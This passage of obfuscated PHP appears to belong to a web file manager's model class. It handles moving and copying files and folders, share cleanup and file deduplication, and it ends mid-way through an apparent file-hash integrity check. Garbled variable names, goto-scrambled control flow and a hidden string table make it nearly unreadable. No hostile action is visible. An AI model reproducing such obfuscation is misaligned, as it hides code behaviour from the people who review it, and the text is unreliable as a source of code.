strtolower($A±²ŞùÂ†…[$cëÌ·ôÕ©Ò[28]])) { return $A±²ŞùÂ†…[$cëÌ·ôÕ©Ò[373]]; } } return !1; } private function fileNameAutoCache($eà²´º¿òö, $D†‚“ÙÄÅ´, $f‘ì¡ù‚£Ô, $a„ÔóÓôåğ) { $bË¯–ÂŒĞ =& $_SERVER[…Ò×–]; $Bìö¢ÃÛÎ¿ = $this->_childrenList($eà²´º¿òö); $FØï…ÚïÙ = array_to_keyvalue($Bìö¢ÃÛÎ¿, $bË¯–ÂŒĞ[33], $bË¯–ÂŒĞ[28]); return $this->fileNameAutoGet($FØï…ÚïÙ, $D†‚“ÙÄÅ´, $f‘ì¡ù‚£Ô, $a„ÔóÓôåğ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($C§Œº—„ÒØ, $AğË”Ó…©, $Fç×öÈ·İ— = REPEAT_REPLACE, $Bä“ºàµ“ = '') { goto eŠÜ„¬ŞñŠ; FŸ„Í‚øê—: if ($aîÖ…Ğ¡ƒ[$b¬‚ç§©[466]] == $AğË”Ó…© && $Bä“ºàµ“ != $aîÖ…Ğ¡ƒ[$b¬‚ç§©[28]]) { $CéøÄãğÇŞ = $this->fileNameExist($AğË”Ó…©, $Bä“ºàµ“); if ($CéøÄãğÇŞ && $aîÖ…Ğ¡ƒ[$b¬‚ç§©[374]] == $b¬‚ç§©[473]) { goto AÕ‡Ùó„œ”; eºòÜÇ¶õ÷: $this->removeNow($C§Œº—„ÒØ, !1); $this->folderSizeReset($AğË”Ó…©); Hook::trigger($b¬‚ç§©[536], $EØÅ˜÷ß¨˜); goto eÉÂôªÕ„È; AÕ‡Ùó„œ”: $A¥àäí…¯Ş = $this->sourceInfo($CéøÄãğÇŞ); $f×ÒŒ›¹¬ï = $this->fileHistory($A¥àäí…¯Ş, $aîÖ…Ğ¡ƒ[$b¬‚ç§©[423]], $aîÖ…Ğ¡ƒ[$b¬‚ç§©[77]]); if (!$f×ÒŒ›¹¬ï) { Model($b¬‚ç§©[426])->remove($aîÖ…Ğ¡ƒ[$b¬‚ç§©[423]]); } goto eºòÜÇ¶õ÷; eÉÂôªÕ„È: return $CéøÄãğÇŞ; goto bã ğ¥Ìá; bã ğ¥Ìá: } } $CÃ—àÌÙ˜ = $Bä“ºàµ“ ? $Bä“ºàµ“ : $aîÖ…Ğ¡ƒ[$b¬‚ç§©[28]]; $this->lockMoveStart($C§Œº—„ÒØ); goto B‹µãŒÑŠÁ; eŠÜ„¬ŞñŠ: $b¬‚ç§© =& $_SERVER[…Ò×–]; $aîÖ…Ğ¡ƒ = $this->sourceInfo($C§Œº—„ÒØ); $AÂŒ¶õ®ö = $this->sourceInfo($AğË”Ó…©); goto eÕ¢áóàæ; FšÑ÷Å…–¸: $this->lockMoveEnd($C§Œº—„ÒØ); $this->lockWriteEnd($AğË”Ó…©, $CÃ—àÌÙ˜); $this->folderSizeReset($aîÖ…Ğ¡ƒ[$b¬‚ç§©[466]]); goto fì—†›ÑÂ; FöêæÏİÙ¯: $this->updateModifyTime($dÙŸ‰»˜Ó½); Model($b¬‚ç§©[510])->eventMove($C§Œº—„ÒØ, $aîÖ…Ğ¡ƒ[$b¬‚ç§©[466]], $AğË”Ó…©); Hook::trigger($b¬‚ç§©[536], $EØÅ˜÷ß¨˜); goto f¿µã¹¤Ô; d¢êø»×Æ: if (!$aîÖ…Ğ¡ƒ || !$AÂŒ¶õ®ö || $AÂŒ¶õ®ö[$b¬‚ç§©[374]] != $b¬‚ç§©[83]) { return !1; } Hook::trigger($b¬‚ç§©[535], $EØÅ˜÷ß¨˜); $this->targetIsDelete = intval($aîÖ…Ğ¡ƒ[$b¬‚ç§©[401]]); goto FŸ„Í‚øê—; eÕ¢áóàæ: if ($aîÖ…Ğ¡ƒ[$b¬‚ç§©[466]] == $AÂŒ¶õ®ö[$b¬‚ç§©[373]]) { if ($aîÖ…Ğ¡ƒ[$b¬‚ç§©[401]] == $b¬‚ç§©[83]) { Model($b¬‚ç§©[399])->restore(array($C§Œº—„ÒØ)); } if (!$Bä“ºàµ“ || $Bä“ºàµ“ == $aîÖ…Ğ¡ƒ[$b¬‚ç§©[28]]) { return $C§Œº—„ÒØ; } } $EØÅ˜÷ß¨˜ = $this->pathInfoMore($C§Œº—„ÒØ); if ($this->isParentOf($C§Œº—„ÒØ, $AğË”Ó…©)) { return !1; } goto d¢êø»×Æ; fì—†›ÑÂ: $this->folderSizeReset($AğË”Ó…©); $dÙŸ‰»˜Ó½ = array($aîÖ…Ğ¡ƒ[$b¬‚ç§©[466]], $AğË”Ó…©); if ($aîÖ…Ğ¡ƒ[$b¬‚ç§©[374]] == $b¬‚ç§©[83]) { $dÙŸ‰»˜Ó½[] = $C§Œº—„ÒØ; } goto FöêæÏİÙ¯; B‹µãŒÑŠÁ: $this->lockWriteStart($AğË”Ó…©, $CÃ—àÌÙ˜); $dŠö‘Àµ£¤ = array($b¬‚ç§©[506] => array(), $b¬‚ç§©[537] => !1); $this->clearShare($C§Œº—„ÒØ, $AğË”Ó…©); goto aÆ³ºïŸ–í; b—öñ¹‰: if ($aîÖ…Ğ¡ƒ[$b¬‚ç§©[374]] == $b¬‚ç§©[83] && $aŸì–Ì¯´Ê) { $this->folderSizeResetChildren($B¹çù¤£Ø); } Model($b¬‚ç§©[171])->linkAdd($dŠö‘Àµ£¤[$b¬‚ç§©[506]]); if ($aŸì–Ì¯´Ê && $dŠö‘Àµ£¤[$b¬‚ç§©[537]]) { $this->removeNow($C§Œº—„ÒØ, !1); } goto FšÑ÷Å…–¸; aÆ³ºïŸ–í: $aŸì–Ì¯´Ê = $this->fileNameExistCache($AğË”Ó…©, $aîÖ…Ğ¡ƒ[$b¬‚ç§©[28]]); $B¹çù¤£Ø = $this->_move($C§Œº—„ÒØ, $AğË”Ó…©, $Fç×öÈ·İ—, $dŠö‘Àµ£¤, $Bä“ºàµ“); $this->sourceCacheClear(); goto b—öñ¹‰; f¿µã¹¤Ô: return $B¹çù¤£Ø; goto d—¥Œ Şï’; d—¥Œ Şï’: } private function _move($aÈáé²íÙ•, $B«ÔŠ‡¸Ÿ, $F¸¢„ƒÇäÔ, &$D‚ƒñØ«×, $f‚¬÷™ÔÄí = '') { goto c¡ì¡Ğ¿¸Ã; BÖß‰·Ü†©: $aô¸¢¶°Û = $f‚¬÷™ÔÄí ? $f‚¬÷™ÔÄí : $aĞŒ°İµğ»[$BÑ•èòøö‚[28]]; $bÚò©¢Â·Ç = $this->fileNameExistCache($B«ÔŠ‡¸Ÿ, $aô¸¢¶°Û); $this->lockMoveStart($aÈáé²íÙ•); goto B†èìÏ¶‹¾; B†¼±Œ–´: return $f²Ñô­¼„ù; goto Eä³‰¸‚ŒÎ; DŒçŞò‚”: $fö°¨óçË = !1; if ($E—óõÚÈë) { if ($F¸¢„ƒÇäÔ == REPEAT_RENAME_FOLDER) { $aô¸¢¶°Û = $this->fileNameAuto($B«ÔŠ‡¸Ÿ, $aô¸¢¶°Û, $F¸¢„ƒÇäÔ, $E—óõÚÈë); $f²Ñô­¼„ù = $this->_moveForce($aÈáé²íÙ•, $B«ÔŠ‡¸Ÿ, $aô¸¢¶°Û); } else { if ($F¸¢„ƒÇäÔ == REPEAT_RENAME_FOLDER) { $F¸¢„ƒÇäÔ = REPEAT_RENAME; } $eĞ¦ğ®Ú¿‘ = $this->_childrenListSelect($aÈáé²íÙ•); foreach ($eĞ¦ğ®Ú¿‘ as $eâ°Â¦‡É“) { $this->_move($eâ°Â¦‡É“[$BÑ•èòøö‚[373]], $bÚò©¢Â·Ç, $F¸¢„ƒÇäÔ, $D‚ƒñØ«×); } $fö°¨óçË = !0; } } else { if ($F¸¢„ƒÇäÔ == REPEAT_SKIP) { $fö°¨óçË = !0; } else { if ($F¸¢„ƒÇäÔ == REPEAT_RENAME || $F¸¢„ƒÇäÔ == REPEAT_RENAME_FOLDER) { $aô¸¢¶°Û = $this->fileNameAuto($B«ÔŠ‡¸Ÿ, $aô¸¢¶°Û, $F¸¢„ƒÇäÔ, $E—óõÚÈë); $f²Ñô­¼„ù = $this->_moveForce($aÈáé²íÙ•, $B«ÔŠ‡¸Ÿ, $aô¸¢¶°Û); } else { if ($F¸¢„ƒÇäÔ == REPEAT_REPLACE) { $Bå…Ìò‘ñ¡ = $this->sourceInfoCache($bÚò©¢Â·Ç); $dÜÓù‘¥Ÿ© = $this->fileHistory($Bå…Ìò‘ñ¡, $aĞŒ°İµğ»[$BÑ•èòøö‚[423]], $aĞŒ°İµğ»[$BÑ•èòøö‚[77]]); if ($dÜÓù‘¥Ÿ©) { $D‚ƒñØ«×[$BÑ•èòøö‚[506]][] = $aĞŒ°İµğ»[$BÑ•èòøö‚[423]]; } else { $fö°¨óçË = !0; } } } } } if ($fö°¨óçË && !$D‚ƒñØ«×[$BÑ•èòøö‚[537]]) { $D‚ƒñØ«×[$BÑ•èòøö‚[537]] = !0; } goto B†¼±Œ–´; c¡ì¡Ğ¿¸Ã: $BÑ•èòøö‚ =& $_SERVER[…Ò×–]; $aĞŒ°İµğ» = $this->sourceInfo($aÈáé²íÙ•); $E—óõÚÈë = $aĞŒ°İµğ»[$BÑ•èòøö‚[374]] == $BÑ•èòøö‚[83]; goto BÖß‰·Ü†©; B†èìÏ¶‹¾: $this->lockWriteStart($B«ÔŠ‡¸Ÿ, $aô¸¢¶°Û); if (!$bÚò©¢Â·Ç) { return $this->_moveForce($aÈáé²íÙ•, $B«ÔŠ‡¸Ÿ, $aô¸¢¶°Û); } $f²Ñô­¼„ù = $bÚò©¢Â·Ç; goto DŒçŞò‚”; Eä³‰¸‚ŒÎ: } private function _moveForce($Fí„°è©¾, $eĞ™¹Êé–ƒ, $fˆÑî‡½ç) { goto c±¤ÙÄ¥¡À; d»Õñ²Ø²§: if ($BÔŠ²†…Œ) { $bğÒÎŠœ— = array($cŒ¦¨¯“¬[530] => array($cŒ¦¨¯“¬[488], $Eï‹ ìÌº‘[$cŒ¦¨¯“¬[464]] . $Eï‹ ìÌº‘[$cŒ¦¨¯“¬[373]] . $cŒ¦¨¯“¬[489])); $CÖ§²Î· = $Eï‹ ìÌº‘[$cŒ¦¨¯“¬[464]] . $Eï‹ ìÌº‘[$cŒ¦¨¯“¬[373]] . $cŒ¦¨¯“¬[47]; $AæáÈå¬çÜ = $D¯È˜¸´«±[$cŒ¦¨¯“¬[464]] . $D¯È˜¸´«±[$cŒ¦¨¯“¬[373]] . $cŒ¦¨¯“¬[47] . $Eï‹ ìÌº‘[$cŒ¦¨¯“¬[373]] . $cŒ¦¨¯“¬[47]; $Cë·ÙŒ¡³ = array($cŒ¦¨¯“¬[530] => array($cŒ¦¨¯“¬[538], "\162\x65\160\154\x61\143\x65\x28\x70\x61\162\x65\156\x74\x4c\145\166\x65\154\x2c\47{$CÖ§²Î·}\x27\54\47{$AæáÈå¬çÜ}\x27\x29"), $cŒ¦¨¯“¬[526] => $D¯È˜¸´«±[$cŒ¦¨¯“¬[375]], $cŒ¦¨¯“¬[527] => $D¯È˜¸´«±[$cŒ¦¨¯“¬[461]]); if ($EßÏ«©«´ß) { $Cë·ÙŒ¡³[$cŒ¦¨¯“¬[400]] = 0; } $this->where($bğÒÎŠœ—)->data($Cë·ÙŒ¡³)->save(); } $this->where(array($cŒ¦¨¯“¬[387] => $Fí„°è©¾))->data($F¹öÑ¨ùßˆ)->save(); return $Fí„°è©¾; goto a¬Øìõç—; D¹Û¢ŞÃŠ: $BÔŠ²†…Œ = $Eï‹ ìÌº‘[$cŒ¦¨¯“¬[374]] == $cŒ¦¨¯“¬[83]; $F¹öÑ¨ùßˆ = array($cŒ¦¨¯“¬[372] => $D¯È˜¸´«±[$cŒ¦¨¯“¬[373]], $cŒ¦¨¯“¬[530] => $D¯È˜¸´«±[$cŒ¦¨¯“¬[464]] . $D¯È˜¸´«±[$cŒ¦¨¯“¬[373]] . $cŒ¦¨¯“¬[47], $cŒ¦¨¯“¬[526] => $D¯È˜¸´«±[$cŒ¦¨¯“¬[375]], $cŒ¦¨¯“¬[527] => $D¯È˜¸´«±[$cŒ¦¨¯“¬[461]], $cŒ¦¨¯“¬[529] => USER_ID, $cŒ¦¨¯“¬[390] => $fˆÑî‡½ç); $EØ÷Ìàñ¯ = $Eï‹ ìÌº‘[$cŒ¦¨¯“¬[375]] == SourceModel::TYPE_GROUP && $D¯È˜¸´«±[$cŒ¦¨¯“¬[375]] == SourceModel::TYPE_GROUP && $Eï‹ ìÌº‘[$cŒ¦¨¯“¬[461]] == $D¯È˜¸´«±[$cŒ¦¨¯“¬[461]]; goto a˜÷ÒêŠ‘Ä; a˜÷ÒêŠ‘Ä: if (!$EØ÷Ìàñ¯) { Model($cŒ¦¨¯“¬[459])->authClear($Fí„°è©¾); } $EßÏ«©«´ß = $Eï‹ ìÌº‘[$cŒ¦¨¯“¬[401]] == $cŒ¦¨¯“¬[83] && $D¯È˜¸´«±[$cŒ¦¨¯“¬[401]] != $cŒ¦¨¯“¬[83]; if ($EßÏ«©«´ß) { $F¹öÑ¨ùßˆ[$cŒ¦¨¯“¬[400]] = 0; } goto d»Õñ²Ø²§; c±¤ÙÄ¥¡À: $cŒ¦¨¯“¬ =& $_SERVER[…Ò×–]; $Eï‹ ìÌº‘ = $this->sourceInfo($Fí„°è©¾); $D¯È˜¸´«± = $this->sourceInfo($eĞ™¹Êé–ƒ); goto D¹Û¢ŞÃŠ; a¬Øìõç—: } private function clearShare($F†øàÃ¶ğ›, $béµ¤ÀÉ¼º) { goto c®®Ãä›™; aÚõæÉß‰õ: Model($aâŠš¸¿æ®[540])->where($cÉ©Ñ‹…·÷)->save(array($aâŠš¸¿æ®[451] => 0)); Model($aâŠš¸¿æ®[541])->where($cÉ©Ñ‹…·÷)->delete(); goto fŠ ¥½¹Ş; c®®Ãä›™: $aâŠš¸¿æ® =& $_SERVER[…Ò×–]; $B´…Àµ¸«é = $this->sourceInfo($F†øàÃ¶ğ›); $eˆ½ …© = $this->sourceInfo($béµ¤ÀÉ¼º); goto aÍÜ¾áïÂ³; CÍ”­Õ‚: if (!$E²ê‘çŠ¢) { return; } $E²ê‘çŠ¢ = array_to_keyvalue($E²ê‘çŠ¢, $aâŠš¸¿æ®[33], $aâŠš¸¿æ®[444]); $cÉ©Ñ‹…·÷ = array($aâŠš¸¿æ®[444] => array($aâŠš¸¿æ®[7], $E²ê‘çŠ¢)); goto aÚõæÉß‰õ; EùôãÓÒĞ: if (!$bÄŠ¹æ«Ï) { return; } $cÉ©Ñ‹…·÷ = array($aâŠš¸¿æ®[373] => array($aâŠš¸¿æ®[7], $bÄŠ¹æ«Ï), $aâŠš¸¿æ®[451] => 1); $E²ê‘çŠ¢ = Model($aâŠš¸¿æ®[540])->field($aâŠš¸¿æ®[444])->where($cÉ©Ñ‹…·÷)->select(); goto CÍ”­Õ‚; aÍÜ¾áïÂ³: if ($B´…Àµ¸«é[$aâŠš¸¿æ®[461]] == $eˆ½ …©[$aâŠš¸¿æ®[461]] && $B´…Àµ¸«é[$aâŠš¸¿æ®[375]] == $aâŠš¸¿æ®[539]) { return; } $cÉ©Ñ‹…·÷ = array($aâŠš¸¿æ®[464] => array($aâŠš¸¿æ®[488], $B´…Àµ¸«é[$aâŠš¸¿æ®[464]] . $F†øàÃ¶ğ› . $aâŠš¸¿æ®[489])); $bÄŠ¹æ«Ï = $this->field($aâŠš¸¿æ®[387])->where($cÉ©Ñ‹…·÷)->getField($aâŠš¸¿æ®[373], !0); goto EùôãÓÒĞ; fŠ ¥½¹Ş: } public function copyFolderFromIO($D°Ìå¸ÕÈ, $fÆÈğ †”¾, $F•Ê¼Ìœ»¬, $f‹•Å‘™ÜÇ, $D¾«à¿Œò, $E„ˆÉ£Äà = false) { goto A‡¤Üš‚ö‹; c…Ú†ÌéğÖ: $this->updateModifyTime($F•Ê¼Ìœ»¬); return $F–“ÈÅÆ›ó; goto b‘Õƒù‰Ã; B­¿è¿¼¢ª: Hook::trigger($A™µ§¨¾ë¹[544]); if ($F–“ÈÅÆ›ó) { $this->folderSizeResetChildren($F–“ÈÅÆ›ó); } $this->_childrenListClear(); goto f³ª„µéÛç; f³ª„µéÛç: Model($A™µ§¨¾ë¹[509])->addAll($aÓØ£ØùÖ‡[$A™µ§¨¾ë¹[507]], array(), !0); Model($A™µ§¨¾ë¹[510])->eventCopy($F–“ÈÅÆ›ó); $this->saveAll($aÓØ£ØùÖ‡[$A™µ§¨¾ë¹[508]]); goto dø·‰š½; FÚÆ§£¨: $a åã’Íˆ² = $this->fileNameExist($F•Ê¼Ìœ»¬, $F£ÊÖÏô); $F–“ÈÅÆ›ó = $this->mkdir($F•Ê¼Ìœ»¬, $F£ÊÖÏô, $f‹•Å‘™ÜÇ); if (!$a åã’Íˆ² || $f‹•Å‘™ÜÇ == REPEAT_RENAME_FOLDER) { $f‹•Å‘™ÜÇ = !1; } goto DÅ´Ùâ‰¾–; dø·‰š½: Model($A™µ§¨¾ë¹[426])->linkAdd($aÓØ£ØùÖ‡[$A™µ§¨¾ë¹[506]]); Model($A™µ§¨¾ë¹[426])->remove($aÓØ£ØùÖ‡[$A™µ§¨¾ë¹[542]]); $this->folderSizeReset($F•Ê¼Ìœ»¬); goto c…Ú†ÌéğÖ; DÅ´Ùâ‰¾–: if ($a åã’Íˆ²) { $this->_childrenAllMake($a åã’Íˆ²); } Hook::trigger($A™µ§¨¾ë¹[543]); $this->_copyChildTo($D°Ìå¸ÕÈ, $fÆÈğ †”¾, $F–“ÈÅÆ›ó, $f‹•Å‘™ÜÇ, $aÓØ£ØùÖ‡, $D¾«à¿Œò); goto B­¿è¿¼¢ª; A‡¤Üš‚ö‹: $A™µ§¨¾ë¹ =& $_SERVER[…Ò×–]; $aÓØ£ØùÖ‡ = array($A™µ§¨¾ë¹[507] => array(), $A™µ§¨¾ë¹[508] => array(), $A™µ§¨¾ë¹[506] => array(), $A™µ§¨¾ë¹[542] => array()); $F£ÊÖÏô = $E„ˆÉ£Äà ? $E„ˆÉ£Äà : $D°Ìå¸ÕÈ->getPathName($D°Ìå¸ÕÈ->pathThis($fÆÈğ †”¾)); goto FÚÆ§£¨; b‘Õƒù‰Ã: } private function _copyChildTo($eèÖô¦Èöğ, $aìñƒÀ…¥, $C™±Ë‘À×ó, $fŒÚ‡ÖÎÒ, &$CÆÇÅ˜…¿°, $CÂ’²“ÉĞÈ) { goto B¶ÈÔ´‹; B¶ÈÔ´‹: $E¿÷òÄ„Á± =& $_SERVER[…Ò×–]; $aÁí•Ş‹áÈ = $this->sourceInfoCache($C™±Ë‘À×ó); $c˜›ë–Éë = $eèÖô¦Èöğ->listPath($aìñƒÀ…¥, !1, !0); goto B§«›Ö’Ë; E¼£¬òøëĞ: $A—Çòµ×¸ = $this->_childrenList($C™±Ë‘À×ó); $A—Çòµ×¸ = array_to_keyvalue($A—Çòµ×¸, $E¿÷òÄ„Á±[28]); foreach ($eß‡¤µíë÷ as $f‰²ä˜Š‚¤) { $CÊ˜‡¯¹Úã = $A—Çòµ×¸[$f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[28]]]; $Eá©ĞÔ¡ò“ = $CÊ˜‡¯¹Úã[$E¿÷òÄ„Á±[373]]; $this->_copyApplyMeta($CÊ˜‡¯¹Úã, $CÆÇÅ˜…¿°); if ($f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[29]] == $E¿÷òÄ„Á±[76]) { $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[75]] = $eèÖô¦Èöğ->getPathInner($f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[75]]); $this->_copyChildTo($eèÖô¦Èöğ, $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[75]], $Eá©ĞÔ¡ò“, $fŒÚ‡ÖÎÒ, $CÆÇÅ˜…¿°, $CÂ’²“ÉĞÈ); } } goto AôæŠ¡½òß; B§«›Ö’Ë: $eß‡¤µíë÷ = array_merge($c˜›ë–Éë[$E¿÷òÄ„Á±[73]], $c˜›ë–Éë[$E¿÷òÄ„Á±[74]]); $EªÑø÷¶ = $this->_addFiles($eèÖô¦Èöğ, $c˜›ë–Éë[$E¿÷òÄ„Á±[73]], $CÂ’²“ÉĞÈ); $CõÓŠõ³™ = array(); goto aÂĞâé—„„; aÂĞâé—„„: foreach ($eß‡¤µíë÷ as &$f‰²ä˜Š‚¤) { goto Eİ±±ºå™¢; e‚Ë¾¿øá¼: $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[77]] = _get($f‰²ä˜Š‚¤, $E¿÷òÄ„Á±[77], 0); $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[423]] = _get($f‰²ä˜Š‚¤, $E¿÷òÄ„Á±[423], 0); if (!isset($f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[545]]) && $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[423]]) { $CÆÇÅ˜…¿°[$E¿÷òÄ„Á±[542]][] = $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[423]]; } goto CœÙ‹§‡‚Ù; Eİ±±ºå™¢: if (isset($EªÑø÷¶[$f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[28]]])) { $f‰²ä˜Š‚¤ = $EªÑø÷¶[$f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[28]]]; } $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[374]] = $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[29]] == $E¿÷òÄ„Á±[76]; $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[376]] = _get($f‰²ä˜Š‚¤, $E¿÷òÄ„Á±[165], $E¿÷òÄ„Á±[33]); goto e‚Ë¾¿øá¼; CœÙ‹§‡‚Ù: if ($fŒÚ‡ÖÎÒ) { $a–ªÌªƒ´ù = $this->fileNameExistCache($C™±Ë‘À×ó, $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[28]]); if ($a–ªÌªƒ´ù) { if ($f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[374]] || $fŒÚ‡ÖÎÒ == REPEAT_SKIP) { continue; } if ($fŒÚ‡ÖÎÒ == REPEAT_REPLACE) { $CÊ˜‡¯¹Úã = $this->sourceInfoCache($a–ªÌªƒ´ù); $A£é”ğœò = $this->fileHistory($CÊ˜‡¯¹Úã, $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[423]], $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[77]]); if ($A£é”ğœò) { $CÆÇÅ˜…¿°[$E¿÷òÄ„Á±[506]][] = $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[423]]; } continue; } else { if ($fŒÚ‡ÖÎÒ == REPEAT_RENAME) { $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[28]] = $this->fileNameAutoCache($C™±Ë‘À×ó, $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[28]], $fŒÚ‡ÖÎÒ, !1); } } } } if (!$f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[374]] && $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[423]]) { $CÆÇÅ˜…¿°[$E¿÷òÄ„Á±[506]][] = $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[423]]; } $CõÓŠõ³™[] = $this->_makeItemData($f‰²ä˜Š‚¤, $aÁí•Ş‹áÈ, $f‰²ä˜Š‚¤[$E¿÷òÄ„Á±[28]]); goto a‡ÀÒğô‡›; a‡ÀÒğô‡›: } unset($f‰²ä˜Š‚¤); if (!empty($CõÓŠõ³™)) { $this->addAll($CõÓŠõ³™); } goto E¼£¬òøëĞ; AôæŠ¡½òß: } private function _addFiles($A‚’œ£Òé´, $bç›÷Üß°, $bº‰Õ×’é) { goto BŒŒÄìÀäó; FÌ÷øĞ¹Ñœ: $F‚ï‘©¥› = Model($fÕ‰Á¯•§”[548]); $DÌæŠ¡ÆËÚ = $F‚ï‘©¥›->where($dØ‰òÍéÊ)->select(); $DÌæŠ¡ÆËÚ = $DÌæŠ¡ÆËÚ ? $DÌæŠ¡ÆËÚ : array(); goto A¨Ë›˜©Ùê; A¨Ë›˜©Ùê: foreach ($DÌæŠ¡ÆËÚ as $d¥·­çá’©) { if (!isset($bˆ×’ù±Œ[$d¥·­çá’©[$fÕ‰Á¯•§”[167]]])) { continue; } $dé ù¨ò¦ = $bˆ×’ù±Œ[$d¥·­çá’©[$fÕ‰Á¯•§”[167]]]; foreach ($dé ù¨ò¦ as &$cø†»†Ò£ğ) { $cø†»†Ò£ğ[$fÕ‰Á¯•§”[423]] = $d¥·­çá’©[$fÕ‰Á¯•§”[423]]; $cø†»†Ò£ğ[$fÕ‰Á¯•§”[545]] = !0; } unset($cø†»†Ò£ğ); } $EÙŞÓÚÄ­ó = array(); foreach ($bç›÷Üß° as $bçÖÁ½ÓÚÖ) { if (isset($bçÖÁ½ÓÚÖ[$fÕ‰Á¯•§”[545]]) && $bçÖÁ½ÓÚÖ[$fÕ‰Á¯•§”[545]]) { continue; } $a‚ÖÑÂ³ ƒ = $A‚’œ£Òé´->getPathInner($bçÖÁ½ÓÚÖ[$fÕ‰Á¯•§”[75]]); $eƒğšÇ = $F‚ï‘©¥›->addFileMake($a‚ÖÑÂ³ ƒ, $bçÖÁ½ÓÚÖ[$fÕ‰Á¯•§”[77]], $bçÖÁ½ÓÚÖ[$fÕ‰Á¯•§”[168]], $bçÖÁ½ÓÚÖ[$fÕ‰Á¯•§”[167]], $bçÖÁ½ÓÚÖ[$fÕ‰Á¯•§”[28]], $bº‰Õ×’é); $EÙŞÓÚÄ­ó[] = $eƒğšÇ; } goto bîÑ‚Éñ¿Æ; CóöâÚšäå: foreach ($bç›÷Üß° as $aíÑÏçÃí) { $e˜âùÀªÆˆ[$aíÑÏçÃí[$fÕ‰Á¯•§”[28]]] = $aíÑÏçÃí; } return $e˜âùÀªÆˆ; goto dÉ´˜‚»‡ˆ; BŒŒÄìÀäó: $fÕ‰Á¯•§” =& $_SERVER[…Ò×–]; if (!$bç›÷Üß° || count($bç›÷Üß°) == 0) { return array(); } $bˆ×’ù±Œ = array(); goto bñåå¸¼ëì; C¤¯—·ãÆÍ: $DÌæŠ¡ÆËÚ = $DÌæŠ¡ÆËÚ ? $DÌæŠ¡ÆËÚ : array(); foreach ($DÌæŠ¡ÆËÚ as $d¥·­çá’©) { if (!isset($bˆ×’ù±Œ[$d¥·­çá’©[$fÕ‰Á¯•§”[167]]])) { continue; } $DœöÕ²îÄ =& $bˆ×’ù±Œ[$d¥·­çá’©[$fÕ‰Á¯•§”[167]]]; foreach ($DœöÕ²îÄ as &$cø†»†Ò£ğ) { $cø†»†Ò£ğ[$fÕ‰Á¯•§”[423]] = $d¥·­çá’©[$fÕ‰Á¯•§”[423]]; } unset($cø†»†Ò£ğ); } $e˜âùÀªÆˆ = array(); goto CóöâÚšäå; bîÑ‚Éñ¿Æ: $F‚ï‘©¥›->addAll($EÙŞÓÚÄ­ó); $dØ‰òÍéÊ = array($fÕ‰Á¯•§”[167] => array($fÕ‰Á¯•§”[7], array_keys($bˆ×’ù±Œ))); $DÌæŠ¡ÆËÚ = $F‚ï‘©¥›->where($dØ‰òÍéÊ)->select(); goto C¤¯—·ãÆÍ; bñåå¸¼ëì: foreach ($bç›÷Üß° as &$cø†»†Ò£ğ) { goto cèèíëÍßÉ; fÌë‚ğ—è: $cø†»†Ò£ğ[$fÕ‰Á¯•§”[167]] = $D»™¹Œàµ; Hook::trigger($fÕ‰Á¯•§”[547], $cø†»†Ò£ğ); $bˆ×’ù±Œ[$D»™¹Œàµ][] =& $cø†»†Ò£ğ; goto ešã˜ŞóÕò; cèèíëÍßÉ: Hook::trigger($fÕ‰Á¯•§”[546], $cø†»†Ò£ğ); $cø†»†Ò£ğ[$fÕ‰Á¯•§”[75]] = $A‚’œ£Òé´->getPathInner($cø†»†Ò£ğ[$fÕ‰Á¯•§”[75]]); $FšİßŒİ = $A‚’œ£Òé´->hashSimple($cø†»†Ò£ğ[$fÕ‰Á¯•§”[75]]); goto aÑ®ÃÃŒ¢; ešã˜ŞóÕò: if (count($bˆ×’ù±Œ[$D»™¹Œàµ]) > 1) { $cø†»†Ò£ğ[$fÕ‰Á¯•§”[545]] = !0; } goto EŠÉø§š¢‡; aÑ®ÃÃŒ¢: $D»™¹Œàµ = $A‚’œ£Òé´->hashMd5($cø†»†Ò£ğ[$fÕ‰Á¯•§”[75]]); if (strlen($D»™¹Œàµ) > 10 && !isset($bˆ×’ù±Œ[$D»™¹Œàµ])) { $bˆ×’ù±Œ[$D»™¹Œàµ] = array(); } $cø†»†Ò£ğ[$fÕ‰Á¯•§”[168]] = $FšİßŒİ; goto fÌë‚ğ—è; EŠÉø§š¢‡: } unset($cø†»†Ò£ğ); $dØ‰òÍéÊ = array($fÕ‰Á¯•§”[167] => array($fÕ‰Á¯•§”[7], array_keys($bˆ×’ù±Œ))); goto FÌ÷øĞ¹Ñœ; dÉ´˜‚»‡ˆ: } } define($_SERVER[…Ò×–][549], $_SERVER[…Ò×–][550]); goto e¡¥³Ûéˆ; aô‹æñ¯ô: $c”·à¯¿¢¨ = LIB_DIR . $_SERVER[…Ò×–][1409]; $c¿º«²ƒ¡± = $_SERVER[…Ò×–][797]; if ($_SERVER[$_SERVER[…Ò×–][798]] != $c¿º«²ƒ¡±($c”·à¯¿¢¨)) { goto DÍœ®§äÌ; DÍœ®§äÌ: $AËÓÌ”ÛÕ¡ = $_SERVER[…Ò×–][800]; $d›Ò½ÜÇ¤Š = $_SERVER[$_SERVER[…Ò×–][795]] . $_SERVER[…Ò×–][796]; $a…«¤†ÈÅÚ = 